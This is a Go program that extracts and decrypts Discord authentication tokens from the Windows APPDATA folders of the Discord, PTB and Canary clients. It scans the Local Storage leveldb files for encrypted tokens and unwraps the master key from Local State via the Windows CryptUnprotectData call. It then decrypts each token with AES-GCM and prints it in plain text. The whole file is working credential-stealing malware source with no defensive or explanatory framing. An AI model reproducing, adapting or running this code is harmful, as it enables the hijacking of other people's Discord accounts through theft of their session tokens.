package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"fmt"
	"os"
	"regexp"
	"syscall"
	"unsafe"

	"github.com/tidwall/gjson"
)

var (
	procUnprotectData = dllcrypt32.NewProc("CryptUnprotectData")
	procLocalFree = dllkernel32.NewProc("LocalFree")

	dllkernel32 = syscall.NewLazyDLL("Kernel32.dll")
	dllcrypt32  = syscall.NewLazyDLL("Crypt32.dll")

	roaming string = os.Getenv("APPDATA")

	discords = []string {
		roaming + "/discord/",
		roaming + "/discordptb/",
		roaming + "/discordcanary/",
	}

)

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

func NewBlob(d []byte) *DATA_BLOB {
	return &DATA_BLOB{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func (b *DATA_BLOB) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

func Decrypt(data []byte) []byte {
	var output DATA_BLOB

	ptr, _, _ := procUnprotectData.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&output)))
	if ptr == 0 {
		return nil
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(output.pbData)))
	return output.ToByteArray()
}

func main(){

	for _, dir := range discords {
		
		storage, _ := os.ReadDir(dir + "Local Storage/leveldb/")
		state, _ := os.ReadFile(dir + "Local State")

		for _, file := range storage {

			EncryptRegex := regexp.MustCompile(`dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*`)
			bytes, _ := os.ReadFile(dir + "Local Storage/leveldb/" +  file.Name())

			for _, crypted_token := range EncryptRegex.FindAll(bytes,10) {

				crypted_key := gjson.Get(string(state),"os_crypt.encrypted_key")
				raw_key, _ := base64.StdEncoding.DecodeString(crypted_key.Str)
				master_key := Decrypt(raw_key[5:])

				raw_token,_ := base64.StdEncoding.DecodeString(string(crypted_token)[12:])
				clean_token := raw_token[3:]

				aes_cipher, _ := aes.NewCipher(master_key)
				gcm_cipher, _ := cipher.NewGCM(aes_cipher)
				nonceSize := gcm_cipher.NonceSize()
				nonce, enc_token := clean_token[:nonceSize], clean_token[nonceSize:]
				token, _ := gcm_cipher.Open(nil, nonce, enc_token, nil)
				
				fmt.Println(string(token))

			}

		}

	}

}


